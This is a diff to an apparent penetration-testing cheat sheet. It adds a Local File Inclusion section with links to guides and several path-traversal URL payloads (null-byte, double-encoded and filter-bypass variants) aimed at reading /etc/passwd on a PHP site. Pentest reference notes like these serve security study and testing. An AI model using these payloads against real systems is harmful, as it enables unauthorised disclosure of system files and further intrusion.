@@ -43,10 +43,20 @@ Jenkins: [pwn jenkins](https://github.com/Scr1ptK1ddie/pwn_jenkins)
 
 ## File Upload Pages  
 
-Local File Include  
+### Local File Include       
+Check for client side scripts 
 [Local File Inclusion](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/#gref)   
 [Guide to LFI](http://www.securityidiots.com/Web-Pentest/LFI/guide-to-lfi.html)    
-	
+[PayloadAllTheThings FI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)  
+
+    http://example.com/index.php?page=../../../etc/passwd  
+    http://example.com/index.php?page=../../../etc/passwd%00                  #PHP below v. 5.3.4 
+    http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00        # double encoding    
+
+
+     http://example.com/index.php?page=....//....//etc/passwd
+     http://example.com/index.php?page=..///////..////..//////etc/passwd
+     http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
 	
 	/etc/passwd, etc.
 	can you include a remote file?
